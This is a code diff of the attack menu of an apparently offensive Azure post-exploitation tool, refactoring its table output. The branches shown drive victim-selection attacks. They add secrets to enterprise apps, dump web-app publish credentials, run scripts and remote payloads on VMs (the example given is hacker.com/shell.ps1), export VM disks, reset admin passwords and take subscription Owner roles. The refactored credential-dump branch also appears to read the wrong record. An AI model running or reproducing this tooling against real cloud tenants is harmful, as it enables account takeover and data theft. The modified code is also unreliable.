-                    ArmTempRecords.field_names = ["#", "Deployment Name", "Parameter Name", "Parameter Value", "Type"]
-                    ArmTempRecordsCount = 0
                     print("Skipping SecureString/Object/Array values from list..")
+                    field_names = ["#", "Deployment Name", "Parameter Name", "Parameter Value", "Type"]
+                    rows = []
+                    armRecordCount = 0
                     for ArmTempRecord in RD_ListARMTemplates():
                         for itStr in ArmTempRecord['params']:
                             if ArmTempRecord['params'][itStr]['type'] == "SecureString" or ArmTempRecord['params'][itStr]['type'] == "Array" or ArmTempRecord['params'][itStr]['type'] == "Object":
                                 continue
-                            ArmTempRecords.add_row(
-                                [ArmTempRecordsCount, ArmTempRecord['name'], itStr, ArmTempRecord['params'][itStr]['type'],
-                                 ArmTempRecord['params'][itStr]['value']])
+                            rows.append({
+                                 "#": armRecordCount,
+                                 "Deployment Name": ArmTempRecord['name'],
+                                 "Parameter Name": itStr,
+                                 "Type": ArmTempRecord['params'][itStr]['type'],
+                                 "Parameter Value": ArmTempRecord['params'][itStr]['value']
+                            })
                         for itStrO in ArmTempRecord['outputs']:
-                            ArmTempRecords.add_row([ArmTempRecordsCount, ArmTempRecord['name'], itStrO, ArmTempRecord['outputs'][itStrO]['type'],ArmTempRecord['outputs'][itStrO]['value']])
-                        ArmTempRecordsCount += 1
-                    print(ArmTempRecords)
+                            rows.append({
+                                "#": armRecordCount,
+                                "Deployment Name": ArmTempRecord['name'],
+                                "Parameter Name": itStrO,
+                                "Type": ArmTempRecord['outputs'][itStrO]['type'],
+                                "Parameter Value": ArmTempRecord['outputs'][itStrO]['value']
+                            })
+                        armRecordCount += 1
+                    print(make_table(field_names, rows))
             elif "Reader/ListAllUsers" in ExploitChoosen and mode == "run":
                 print("Trying to list all users.. (it might take a few minutes)")
-                AllUsersRecords = PrettyTable()
-                AllUsersRecords.align = "l"
-                AllUsersRecords.field_names = ["#", "DisplayName", "First", "Last", "mobilePhone", "mail", "userPrincipalName"]
+                field_names = ["#", "DisplayName", "First", "Last", "mobilePhone", "mail", "userPrincipalName"]
+                rows = []
                 AllUsersRecordsCount = 0
                 for UserRecord in RD_ListAllUsers()['value']:
-                    AllUsersRecords.add_row([AllUsersRecordsCount, UserRecord['displayName'], UserRecord['givenName'], UserRecord['surname'], UserRecord['mobilePhone'], UserRecord['mail'], UserRecord['userPrincipalName']])
+                    rows.append(
+                        {"#": AllUsersRecordsCount,
+                         "DisplayName": UserRecord['displayName'],
+                         "First": UserRecord['givenName'],
+                         "Last": UserRecord['surname'],
+                         "mobilePhone": UserRecord['mobilePhone'],
+                         "mail": UserRecord['mail'],
+                         "userPrincipalName": UserRecord['userPrincipalName']
+                         }
+                    )
                     AllUsersRecordsCount += 1
-                print(AllUsersRecords)
+                print(make_table(field_names, rows))
             elif "Reader/ListAllStorageAccounts" in ExploitChoosen and mode == "run":
                 print("Trying to list all storage accounts.. (it might take a few minutes)")
                 if len(RD_ListAllStorageAccounts()) < 1:
-                    print("No Runbooks were found.")
+                    print("No Storage Accounts were found.")
                 else:
-                    AllStorageAccountsRecords = PrettyTable()
-                    AllStorageAccountsRecords.align = "l"
-                    AllStorageAccountsRecords.field_names = ["#", "Name", "Location", "Type", "CustomDomain", "AllowBlobPublicAccess", "AllowSharedKeyAccess", "Resource Group"]
+                    field_names = ["#", "Name", "Location", "Type", "CustomDomain", "AllowBlobPublicAccess", "AllowSharedKeyAccess", "Resource Group"]
+                    rows = []
                     AllStorageAccountRecordsCount = 0
                     for SARecord in RD_ListAllStorageAccounts():
-                        AllStorageAccountsRecords.add_row(
-                            [AllStorageAccountRecordsCount, SARecord['name'], SARecord['location'], SARecord['type'], SARecord['customDomain'],
-                             SARecord['properties']['allowBlobPublicAccess'], SARecord['allowSharedKeyAccess'], SARecord['resourceGroup']])
+                        rows.append(
+                            {"#": AllStorageAccountRecordsCount,
+                             "Name":  SARecord['name'],
+                             "Location": SARecord['location'],
+                             "Type": SARecord['type'],
+                             "CustomDomain": SARecord['customDomain'],
+                             "AllowBlobPublicAccess": SARecord['properties']['allowBlobPublicAccess'],
+                             "AllowSharedKeyAccess": SARecord['allowSharedKeyAccess'],
+                             "Resource Group": SARecord['resourceGroup']
+                             }
+                        )
                         AllStorageAccountRecordsCount += 1
-                    print(AllStorageAccountsRecords)
+                    print(make_table(field_names, rows))
             elif "Reader/ListAllVaults" in ExploitChoosen and mode == "run":
                 print("Trying to list all vaults.. (it might take a few minutes)")
                 if len(RD_ListAllVaults()) < 1:
-                    print("No Runbooks were found.")
+                    print("No Vaults were found.")
                 else:
-                    AllVaultsRecords = PrettyTable()
-                    AllVaultsRecords.align = "l"
-                    AllVaultsRecords.field_names = ["#", "Name", "Location", "Type", "Resource Group", "SubscriptionId"]
-                    AllVaultRecordsCount = 0
+                    field_names = ["#", "Name", "Location", "Type", "Resource Group", "SubscriptionId"]
+                    rows = []
+                    vaultRecordCount = 0
                     for VaultRecord in RD_ListAllVaults():
-                            AllVaultsRecords.add_row([AllVaultRecordsCount, VaultRecord['name'],VaultRecord['location'], VaultRecord['type'], VaultRecord['resourceGroup'], VaultRecord['subscriptionId']])
-                            AllVaultRecordsCount += 1
-                    print(AllVaultsRecords)
+                        rows.append(
+                            {"#": vaultRecordCount, "Name": VaultRecord['name'],
+                             "Location": VaultRecord['location'], "Type": VaultRecord['type'],
+                             "Resource Group": VaultRecord['resourceGroup'],
+                             "SubscriptionId": VaultRecord['subscriptionId']}
+                        )
+                        vaultRecordCount += 1
+                    print(make_table(field_names, rows))
             elif "Reader/ListVirtualMachines" in ExploitChoosen and mode == "run":
                 print("Trying to list all virtual machines.. (it might take a few minutes)")
                 if len(RD_ListAllVMs()) < 1:
                     print("No VMs were found.")
                 else:
-                    AllVMRecords = PrettyTable()
-                    AllVMRecords.align = "l"
-                    AllVMRecords.field_names = ["#", "Name", "Location", "PublicIP", "ResourceGroup", "Identity", "SubscriptionId"]
+                    field_names = ["#", "Name", "Location", "PublicIP", "ResourceGroup", "Identity", "SubscriptionId"]
+                    rows = []
                     AllVMRecordsCount = 0
                     for UserVMRecord in RD_ListAllVMs():
                         if UserVMRecord['identity'] == "N/A":
@@ -1410,92 +1406,142 @@ def attackWindow():
                         else:
                             VMIdentity = UserVMRecord['identity']['type']
                         if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']) == "N/A":
-                            AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'], "N/A", UserVMRecord['resourceGroup'], VMIdentity, UserVMRecord['subscriptionId']])
+                            rows.append(
+                                {"#": AllVMRecordsCount,
+                                 "Name": UserVMRecord['name'],
+                                 "Location": UserVMRecord['location'],
+                                 "PublicIP": "N/A",
+                                 "ResourceGroup": UserVMRecord['resourceGroup'],
+                                 "Identity": VMIdentity,
+                                 "SubscriptionId": UserVMRecord['subscriptionId']
+                                 }
+                            )
                         else:
-                            AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'], HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],UserVMRecord['name']), UserVMRecord['resourceGroup'], VMIdentity, UserVMRecord['subscriptionId']])
-                            AllVMRecordsCount += 1
-                    print(AllVMRecords)
+                            rows.append(
+                                {"#": AllVMRecordsCount,
+                                 "Name": UserVMRecord['name'],
+                                 "Location": UserVMRecord['location'],
+                                 "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],
+                                                                 UserVMRecord['resourceGroup'], UserVMRecord['name']),
+                                 "ResourceGroup": UserVMRecord['resourceGroup'],
+                                 "Identity": VMIdentity,
+                                 "SubscriptionId": UserVMRecord['subscriptionId']
+                                 }
+                            )
+                        AllVMRecordsCount += 1
+                    print(make_table(field_names, rows))
             elif "Reader/ListServicePrincipal" in ExploitChoosen and mode == "run":
                 print("Trying to enumerate all service principles (App registrations)..")
                 if len(RD_AddAppSecret()) < 1:
                     print("No Apps registrations were found.")
                 else:
-                    EntAppsRecords = PrettyTable()
-                    EntAppsRecords.align = "l"
-                    EntAppsRecords.field_names = ["#", "App Name", "AppId", "Domain", "Has Ownership?"]
+                    field_names = ["#", "App Name", "AppId", "Domain", "Has Ownership?"]
+                    rows = []
                     EntAppsRecordsCount = 0
                     for EntAppsRecord in RD_AddAppSecret()['value']:
-                        EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'], EntAppsRecord['publisherDomain'], CHK_AppRegOwner(EntAppsRecord['appId'])])
+                        rows.append(
+                            {"#": EntAppsRecordsCount, "App Name": EntAppsRecord['displayName'],
+                             "AppId": EntAppsRecord['appId'], "Domain": EntAppsRecord['publisherDomain'],
+                             "Has Ownership?": CHK_AppRegOwner(EntAppsRecord['appId'])}
+                        )
                         EntAppsRecordsCount += 1
-                    print(EntAppsRecords)
+                    print(make_table(field_names, rows))
             elif "Reader/abuseServicePrincipals" in ExploitChoosen and mode == "run":
                 print("Trying to enumerate all Enterprise applications (service principals)..")
                 if len(RD_AddAppSecret()) < 1:
                     print("No service principals were found.")
                 else:
-                    EntAppsRecords = PrettyTable()
-                    EntAppsRecords.align = "l"
-                    EntAppsRecords.field_names = ["#", "App Name", "AppId", "Domain", "Can Abused?"]
+                    field_names = ["#", "App Name", "AppId", "Domain", "Can Abused?"]
+                    rows = []
                     EntAppsRecordsCount = 0
                     for EntAppsRecord in RD_AddAppSecret()['value']:
                         print("Trying to register service principle for " + EntAppsRecord['displayName'] + " app..")
                         pwdGen = RD_addPasswordForEntrepriseApp(EntAppsRecord['appId'])
                         if pwdGen == "N/A":
-                            EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'], EntAppsRecord['publisherDomain'], "N/A"])
+                            rows.append(
+                                {"#": EntAppsRecordsCount, "App Name": EntAppsRecord['displayName'],
+                                 "AppId": EntAppsRecord['appId'], "Domain": EntAppsRecord['publisherDomain'],
+                                 "Can Abused?": "N/A"})
                         else:
-                            EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'],
-                                                    EntAppsRecord['publisherDomain'],pwdGen])
+                            rows.append(
+                                {"#": EntAppsRecordsCount, "App Name": EntAppsRecord['displayName'],
+                                 "AppId": EntAppsRecord['appId'], "Domain": EntAppsRecord['publisherDomain'],
+                                 "Can Abused?": pwdGen})
                         EntAppsRecordsCount += 1
-                    print(EntAppsRecords)
+                    print(make_table(field_names, rows))
             elif "Contributor/DumpWebAppPublishProfile" in ExploitChoosen and mode == "run":
                 print("Trying to enumerate app service sites.. (it might take a few minutes)")
                 if len(RD_ListAllDeployments()) < 1:
                     print("No deployments were found.")
                 else:
-                    AllDepolymentsRecords = PrettyTable()
-                    AllDepolymentsRecords.align = "l"
-                    AllDepolymentsRecords.field_names = ["#", "ProfileName", "User", "Password", "Host"]
+                    field_names = ["#", "ProfileName", "User", "Password", "Host"]
+                    rows = []
                     AllDepolymentsRecordsCount = 0
                     for DeploymentRecord in RD_ListAllDeployments():
                         print("Enumerate strings for site " + DeploymentRecord['name'] + " ...")
                         DataStrings = CON_GetPublishProfileBySite(DeploymentRecord['id'])
-                        for data in DataStrings:
-                            AllDepolymentsRecords.add_row([AllDepolymentsRecordsCount, data['name'], data['user'], data['pwd'], data['host']])
+                        if "Failed to parse deployment template" in DataStrings:
+                            print(DataStrings)
+                            continue
+                        else:
+                            for data in DataStrings:
+                                rows.append(
+                                    {"#": AllDepolymentsRecordsCount, "ProfileName": data['name'],
+                                     "User": DeploymentRecord['user'], "Password": DeploymentRecord['pwd'],
+                                     "Host": DeploymentRecord['host']}
+                                )
                             AllDepolymentsRecordsCount += 1
-                    print(AllDepolymentsRecords)
+                    print(make_table(field_names, rows))
             elif "Reader/ListAppServiceSites" in ExploitChoosen and mode == "run":
                 print("Trying to enumerate app service sites.. (it might take a few minutes)")
                 if len(RD_ListAllDeployments()) < 1:
                     print("No deployments were found.")
                 else:
-                    AllDepolymentsRecords = PrettyTable()
-                    AllDepolymentsRecords.align = "l"
-                    AllDepolymentsRecords.field_names = ["#", "SiteName", "Location", "Type", "Status"]
-                    AllDepolymentsRecordsCount = 0
+                    field_names = ["#", "SiteName", "Location", "Type", "Status"]
+                    rows = []
+                    AllDepolymentsRecords = 0
                     for DeploymentRecord in RD_ListAllDeployments():
-                        AllDepolymentsRecords.add_row([AllDepolymentsRecordsCount, DeploymentRecord['name'], DeploymentRecord['location'], DeploymentRecord['type'], DeploymentRecord['properties']['state']])
-                        AllDepolymentsRecordsCount += 1
-                    print(AllDepolymentsRecords)
+                        rows.append(
+                            {"#": AllDepolymentsRecords, "SiteName": DeploymentRecord['name'],
+                             "Location": DeploymentRecord['location'], "Type": DeploymentRecord['type'],
+                             "Status": DeploymentRecord['properties']['state']}
+                        )
+                        AllDepolymentsRecords += 1
+                    print(make_table(field_names, rows))
             elif "Contributor/RunCommandVM" in ExploitChoosen and mode == "run":
                 print("Trying to list exposed virtual machines.. (it might take a few minutes)")
                 if len(RD_ListAllVMs()) < 1:
                     print("No VMs were found.")
                 else:
                     victims = {}
-                    AllVMRecords = PrettyTable()
-                    AllVMRecords.align = "l"
-                    AllVMRecords.field_names = ["#", "Name", "Location", "PublicIP", "OSType", "ResourceGroup","SubscriptionId"]
+                    field_names = ["#", "Name", "Location", "PublicIP", "OSType", "Identity", "ResourceGroup","SubscriptionId"]
+                    rows = []
                     AllVMRecordsCount = 0
                     for UserVMRecord in RD_ListAllVMs():
+                        if UserVMRecord['identity'] == "N/A":
+                            VMIdentity = "N/A"
+                        else:
+                            VMIdentity = UserVMRecord['identity']['type']
                         if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']) == "N/A":
                             continue
                         else:
-                            victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],"os": UserVMRecord['properties']['storageProfile']['osDisk']['osType'], "location": UserVMRecord['location'],"subId": UserVMRecord['subscriptionId'],"rg": UserVMRecord['resourceGroup']}
-                            AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'],HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'], UserVMRecord['name']),UserVMRecord['properties']['storageProfile']['osDisk']['osType'],
-                                                  UserVMRecord['resourceGroup'],
-                                                  UserVMRecord['subscriptionId']])
-                            AllVMRecordsCount += 1
-                    print(AllVMRecords)
+                            victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
+                                                          "os": UserVMRecord['properties']['storageProfile']['osDisk']['osType'], "location": UserVMRecord['location'],
+                                                          "subId": UserVMRecord['subscriptionId'],
+                                                          "rg": UserVMRecord['resourceGroup']}
+                            rows.append(
+                                {"#": AllVMRecordsCount,
+                                 "Name": UserVMRecord['name'],
+                                 "Location": UserVMRecord['location'],
+                                 "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'], UserVMRecord['name']),
+                                 "OSType": UserVMRecord['properties']['storageProfile']['osDisk']['osType'],
+                                 "ResourceGroup": UserVMRecord['resourceGroup'],
+                                 "Identity": VMIdentity,
+                                 "SubscriptionId": UserVMRecord['subscriptionId']
+                                 }
+                            )
+                        AllVMRecordsCount += 1
+                    print(make_table(field_names, rows))
                     TargetVM = input("Select Target VM Name [i.e. 1]: ")
                     Selection = int(TargetVM)
                     CmdVMPath = input("Enter Path for Script [i.e. C:\exploit\shell.ps1]: ")
@@ -1508,51 +1554,60 @@ def attackWindow():
                     print("No VMs were found.")
                 else:
                     victims = {}
-                    AllVMRecords = PrettyTable()
-                    AllVMRecords.align = "l"
-                    AllVMRecords.field_names = ["#", "Name", "Location", "DiskName", "VM Status"]
+                    field_names = ["#", "Name", "Location", "DiskName", "VM Status"]
+                    rows = []
                     AllVMRecordsCount = 0
                     for UserVMRecord in RD_ListAllVMs():
                             VMState = HLP_GetVMInstanceView(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],UserVMRecord['name'])
                             if VMState != "PowerState/deallocated":
                                 continue
                             victims[AllVMRecordsCount] = {"name": UserVMRecord['name'], "location": UserVMRecord['location'], "diskName": UserVMRecord['properties']['storageProfile']['osDisk']['name'],"subId": UserVMRecord['subscriptionId'],"rg": UserVMRecord['resourceGroup']}
-                            AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'], UserVMRecord['properties']['storageProfile']['osDisk']['name'], VMState])
+                            rows.append(
+                                {"#": AllVMRecordsCount,
+                                 "Name": UserVMRecord['name'],
+                                 "Location": UserVMRecord['location'],
+                                 "DiskName": UserVMRecord['properties']['storageProfile']['osDisk']['name'],
+                                 "VM Status": VMState
+                                 }
+                            )
                             AllVMRecordsCount += 1
-                    print(AllVMRecords)
+                    print(make_table(field_names, rows))
                     TargetVM = input("Select Target DiskVM [i.e. 1]: ")
                     print("Create a SAS link for VHD download...")
                     Selection = int(TargetVM)
-                    print(CON_GenerateVMDiskSAS(victims[Selection]["subId"], victims[Selection]["rg"], victims[Selection]["diskName"], victims[Selection]["location"]))
+                    print(CON_GenerateVMDiskSAS(victims[Selection]["subId"], victims[Selection]["rg"], victims[Selection]["diskName"]))
             elif "Contributor/VMExtensionExecution" in ExploitChoosen and mode == "run":
                 print("Trying to list exposed virtual machines.. (it might take a few minutes)")
                 if len(RD_ListAllVMs()) < 1:
                     print("No VMs were found.")
                 else:
                     victims = {}
-                    AllVMRecords = PrettyTable()
-                    AllVMRecords.align = "l"
-                    AllVMRecords.field_names = ["#", "Name", "Location", "PublicIP", "adminUsername", "ResourceGroup",
+                    field_names = ["#", "Name", "Location", "PublicIP", "adminUsername", "ResourceGroup",
                                                 "SubscriptionId"]
+                    rows = []
                     AllVMRecordsCount = 0
                     for UserVMRecord in RD_ListAllVMs():
-                        if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],
-                                               UserVMRecord['name']) == "N/A":
+                        if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']) == "N/A":
                             continue
                         else:
                             victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
-                                                          "username": UserVMRecord['properties']['osProfile'][
-                                                              'adminUsername'], "location": UserVMRecord['location'],
+                                                          "username": UserVMRecord['properties']['osProfile']['adminUsername'],
+                                                          "location": UserVMRecord['location'],
                                                           "subId": UserVMRecord['subscriptionId'],
                                                           "rg": UserVMRecord['resourceGroup']}
-                            AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'],
-                                                  HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],
+                            rows.append(
+                                {"#": AllVMRecordsCount,
+                                 "Name": UserVMRecord['name'],
+                                 "Location": UserVMRecord['location'],
+                                 "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],
                                                                       UserVMRecord['resourceGroup'], UserVMRecord['name']),
-                                                  UserVMRecord['properties']['osProfile']['adminUsername'],
-                                                  UserVMRecord['resourceGroup'],
-                                                  UserVMRecord['subscriptionId']])
+                                 "adminUsername": UserVMRecord['properties']['osProfile']['adminUsername'],
+                                 "ResourceGroup": UserVMRecord['resourceGroup'],
+                                 "SubscriptionId": UserVMRecord['subscriptionId']
+                                 }
+                            )
                             AllVMRecordsCount += 1
-                    print(AllVMRecords)
+                    print(make_table(field_names, rows))
                     TargetVM = input("Select Target VM Name [i.e. 1]: ")
                     RemotePayload = input("Enter Remote Payload [i.e. https://hacker.com/shell.ps1]: ")
                     Selection = int(TargetVM)
@@ -1564,23 +1619,36 @@ def attackWindow():
                     print("No VMs were found.")
                 else:
                     victims = {}
-                    AllVMRecords = PrettyTable()
-                    AllVMRecords.align = "l"
-                    AllVMRecords.field_names = ["#", "Name", "Location", "PublicIP",  "adminUsername", "ResourceGroup", "SubscriptionId"]
+                    field_names = ["#", "Name", "Location", "PublicIP", "adminUsername", "ResourceGroup",
+                                   "SubscriptionId"]
+                    rows = []
                     AllVMRecordsCount = 0
                     for UserVMRecord in RD_ListAllVMs():
-                        if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']) == "N/A":
+                        if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],
+                                               UserVMRecord['name']) == "N/A":
                             continue
                         else:
-                            victims[AllVMRecordsCount] = {"name": UserVMRecord['name'], "username": UserVMRecord['properties']['osProfile']['adminUsername'], "location": UserVMRecord['location'], "subId": UserVMRecord['subscriptionId'], "rg": UserVMRecord['resourceGroup']}
-                            AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'], HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']),
-                                                  UserVMRecord['properties']['osProfile']['adminUsername'], UserVMRecord['resourceGroup'],
-                                                  UserVMRecord['subscriptionId']])
+                            victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
+                                                          "username": UserVMRecord['properties']['osProfile']['adminUsername'],
+                                                          "location": UserVMRecord['location'],
+                                                          "subId": UserVMRecord['subscriptionId'],
+                                                          "rg": UserVMRecord['resourceGroup']}
+                            rows.append(
+                                {"#": AllVMRecordsCount,
+                                 "Name": UserVMRecord['name'],
+                                 "Location": UserVMRecord['location'],
+                                 "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],
+                                                                 UserVMRecord['resourceGroup'], UserVMRecord['name']),
+                                 "adminUsername": UserVMRecord['properties']['osProfile']['adminUsername'],
+                                 "ResourceGroup": UserVMRecord['resourceGroup'],
+                                 "SubscriptionId": UserVMRecord['subscriptionId']
+                                 }
+                            )
                             AllVMRecordsCount += 1
-                    print(AllVMRecords)
+                    print(make_table(field_names, rows))
                     TargetVM = input("Select Target VM Name [i.e. 1]: ")
                     Selection = int(TargetVM)
-                    print(CON_VMExtensionResetPwd(victims[Selection]["subId"],victims[Selection]["location"],victims[Selection]["rg"],victims[Selection]["name"], "RandomExtNas", victims[Selection]["username"]))
+                    print(CON_VMExtensionResetPwd(victims[Selection]["subId"],victims[Selection]["location"],victims[Selection]["rg"],victims[Selection]["name"], victims[Selection]["username"]))
             elif "GlobalAdministrator/elevateAccess" in ExploitChoosen and mode == "run":
                 print("Elevating access to the root management group..")
                 print(GA_ElevateAccess())
@@ -1589,19 +1657,23 @@ def attackWindow():
                 if listSubs.get('value') == None:
                     print("Exploit Failed: Error occured. Result: " + str(listSubs['error']['message']))
                 else:
-                    subRecords = PrettyTable()
-                    subRecords.align = "l"
-                    subRecords.field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
+                    field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
+                    rows = []
+                    victims = {}
                     subRecordCount = 0
                     for subRecord in listSubs['value']:
-                        subRecords.add_row(
-                            [subRecordCount, subRecord['subscriptionId'], subRecord['displayName'], subRecord['state'],
-                             subRecord['subscriptionPolicies']['quotaId'],
-                             subRecord['subscriptionPolicies']['spendingLimit']])
+                        victims[subRecordCount] = {"name": subRecord['displayName']}
+                        rows.append(
+                            {"#": subRecordCount, "SubscriptionId": subRecord['subscriptionId'],
+                             "displayName": subRecord['displayName'], "State": subRecord['state'],
+                             "Plan": subRecord['subscriptionPolicies']['quotaId'],
+                             "spendingLimit": subRecord['subscriptionPolicies']['spendingLimit']}
+                        )
                         subRecordCount += 1
-                    print(subRecords)
-                    TargetSubscriptionVictim = input("Choose Subscription >> ")
-                    print(GA_AssignSubscriptionOwnerRole(str(TargetSubscriptionVictim)))
+                    print(make_table(field_names, rows))
+                    TargetSubscriptionVictim = input("Choose Subscription [i.e. 0]: ")
+                    Selection = int(TargetSubscriptionVictim)
+                    print(GA_AssignSubscriptionOwnerRole(victims[Selection]["name"]))
             else:
                 print("unkown command.")
 
